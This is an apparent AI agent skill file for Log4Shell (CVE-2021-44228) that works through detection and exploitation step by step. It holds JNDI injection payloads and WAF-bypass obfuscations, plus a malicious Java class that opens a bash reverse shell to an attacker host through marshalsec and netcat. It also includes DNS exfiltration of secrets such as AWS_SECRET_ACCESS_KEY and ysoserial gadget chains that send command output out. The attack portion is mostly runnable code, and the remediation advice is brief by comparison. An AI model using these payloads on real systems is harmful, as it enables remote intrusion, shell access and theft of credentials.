---
name: vuln-log4shell
description: "Log4Shell (CVE-2021-44228) detection and exploitation. JNDI injection, WAF bypass obfuscation, interactsh OOB detection, marshalsec LDAP exploit server, ysoserial gadget chains. Triggers: 'log4shell', 'log4j', 'jndi injection', 'cve-2021-44228', 'log4j rce', 'jndi ldap', 'jndi rmi', 'log4j2', 'log4j exploit'."
---

# Log4Shell (CVE-2021-44228)

Critical RCE in Apache Log4j 2.x (≤2.14.1) via JNDI lookup injection.
CVSS: 10.0. Affects any Java app logging user-controlled input with Log4j2.

## Install

```bash
# interactsh (OOB detection):
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# nuclei (automated scan):
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# marshalsec (JNDI exploit server):
git clone https://github.com/mbechler/marshalsec /opt/marshalsec
cd /opt/marshalsec && mvn clean package -DskipTests -q

# Java (required):
sudo apt-get install -y default-jdk maven
```

---

## Phase 1: Detection — OOB via interactsh

```bash
# Start interactsh client:
interactsh-client &
# Gives you: xxx.oast.fun

CALLBACK="xxx.oast.fun"
TARGET="https://TARGET"

# Inject into common headers:
curl -sk "$TARGET" \
  -H "X-Api-Version: \${jndi:ldap://$CALLBACK/a}" \
  -H "User-Agent: \${jndi:ldap://$CALLBACK/b}" \
  -H "X-Forwarded-For: \${jndi:ldap://$CALLBACK/c}" \
  -H "Referer: \${jndi:ldap://$CALLBACK/d}" \
  -H "Cookie: session=\${jndi:ldap://$CALLBACK/e}" \
  -H "Authorization: Bearer \${jndi:ldap://$CALLBACK/f}" \
  -H "X-Real-IP: \${jndi:ldap://$CALLBACK/g}" \
  -H "CF-Connecting-IP: \${jndi:ldap://$CALLBACK/h}"

# Watch interactsh output for DNS/LDAP callbacks
```

---

## Phase 2: Automated Detection — nuclei

```bash
nuclei -t cves/2021/CVE-2021-44228.yaml -u $TARGET -interactsh-server interact.sh
nuclei -t cves/2021/ -u $TARGET -tags log4j

# Bulk scan:
cat targets.txt | nuclei -t cves/2021/CVE-2021-44228.yaml \
  -interactsh-server interact.sh -bulk-size 50 -concurrency 25
```

---

## Phase 3: WAF Bypass Obfuscation

```bash
# If WAF blocks "jndi:" — use obfuscation:
CALLBACK="xxx.oast.fun"

PAYLOADS=(
  "\${jndi:ldap://$CALLBACK/a}"
  "\${jndi:\${lower:l}dap://$CALLBACK/a}"
  "\${\${lower:j}ndi:ldap://$CALLBACK/a}"
  "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://$CALLBACK/a}"
  "\${\${upper:j}ndi:ldap://$CALLBACK/a}"
  "\${j\${::-n}di:ldap://$CALLBACK/a}"
  "\${jndi:dns://$CALLBACK/a}"
  "\${jndi:rmi://$CALLBACK/a}"
)

for payload in "${PAYLOADS[@]}"; do
  echo "Testing: $payload"
  curl -sk "$TARGET" -H "X-Api-Version: $payload" -o /dev/null -w '%{http_code}\n'
done

# URL-encoded:
# %24%7Bjndi%3Aldap%3A%2F%2F$CALLBACK%2Fa%7D
```

---

## Phase 4: Exploitation — marshalsec LDAP → HTTP

```bash
ATTACKER_IP="YOUR_IP"
LPORT=4444

# Step 1: Create malicious Java class:
mkdir /opt/log4shell-exploit && cd /opt/log4shell-exploit
cat > Exploit.java << 'EOF'
public class Exploit {
  static {
    try {
      String[] cmd = {"/bin/bash", "-c",
        "bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1"};
      Runtime.getRuntime().exec(cmd);
    } catch (Exception e) {}
  }
}
EOF

# Replace placeholders:
sed -i "s/ATTACKER_IP/$ATTACKER_IP/" Exploit.java
sed -i "s/LPORT/$LPORT/" Exploit.java

# Compile:
javac Exploit.java

# Step 2: Serve malicious class via HTTP:
python3 -m http.server 8888 &

# Step 3: Start LDAP redirect server (marshalsec):
java -cp /opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://$ATTACKER_IP:8888/#Exploit" &

# Step 4: Start listener:
nc -lvnp $LPORT &

# Step 5: Trigger:
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:ldap://$ATTACKER_IP:1389/a}"
```

---

## Phase 5: Exploitation — DNS Exfil (Data Extraction Without Shell)

```bash
CALLBACK="xxx.oast.fun"

# Exfiltrate hostname:
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:dns://\${hostName}.$CALLBACK/a}"

# Exfiltrate environment variable:
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:dns://\${env:AWS_SECRET_ACCESS_KEY}.$CALLBACK/a}"

# Exfiltrate Java properties:
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:dns://\${java:version}.$CALLBACK/a}"
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:dns://\${sys:user.home}.$CALLBACK/a}"
```

---

## Phase 6: Newer JVM — ysoserial Gadget Chains

```bash
# JVM ≥ 8u191: trustURLCodebase=false by default → direct class load blocked
# Use gadget chains in target classpath instead:

# Download ysoserial:
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payload (CommonsCollections5 if commons-collections 3.x in classpath):
java -jar ysoserial-all.jar CommonsCollections5 "curl $ATTACKER_IP:9999/?x=\$(id)" | base64

# Other gadget chains to try:
# CommonsCollections1, CommonsCollections2, CommonsCollections3
# Spring1, Spring2
# Groovy1

# Check target classpath indicators from headers/errors:
curl -sk "$TARGET" -I 2>&1 | grep -iE "spring|struts|tomcat|glassfish|wildfly"
```

---

## Phase 7: Verification & Report

```bash
# Verify exploitation:
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:ldap://$CALLBACK/verify-$(date +%s)}"
# Check for DNS/LDAP callback in interactsh

# Proof of RCE (safe data exfil):
curl -sk "$TARGET" -H "X-Api-Version: \${jndi:dns://\${java:version}.\${hostName}.$CALLBACK/a}"
```

```markdown
## Vulnerability Report: Log4Shell (CVE-2021-44228)

**Severity:** Critical (CVSS 10.0)
**Affected:** Apache Log4j2 [VERSION]
**Injection Point:** [HEADER/PARAMETER]

### Evidence
- Payload: `${jndi:ldap://CALLBACK/a}` in [HEADER]
- OOB Callback: DNS/LDAP interaction received at [TIMESTAMP]
- Data exfil: `${jndi:dns://${java:version}.${hostName}.CALLBACK}` → `Java 8.0_181.targethost`

### Impact
Unauthenticated Remote Code Execution as the application's OS user.

### Remediation
1. Upgrade Log4j2 to ≥ 2.17.1 (or ≥ 2.12.4 for Java 8, ≥ 2.3.2 for Java 7)
2. Temporary mitigation: `-Dlog4j2.formatMsgNoLookups=true` (NOT sufficient for 2.15.x)
3. WAF rule: block `${jndi:` pattern in all input vectors
```

## Affected Versions

| Version | Status |
|:---|:---|
| Log4j2 ≤ 2.14.1 | Vulnerable (RCE) |
| Log4j2 2.15.0 | Partial (DoS via CVE-2021-45046) |
| Log4j2 2.16.0 | JNDI disabled by default |
| Log4j2 ≥ 2.17.1 | Patched |
| Log4j 1.x | EOL — use CVE-2019-17571 |

## Output

Save to `.omop/engagement/vuln/log4shell/`:
- `detection.txt` — OOB callback proof
- `exploitation.txt` — RCE proof (safe command output)

## Next Phase

→ `pentest-exploit` for post-exploitation from obtained shell
→ `pentest-report` for CVE report generation
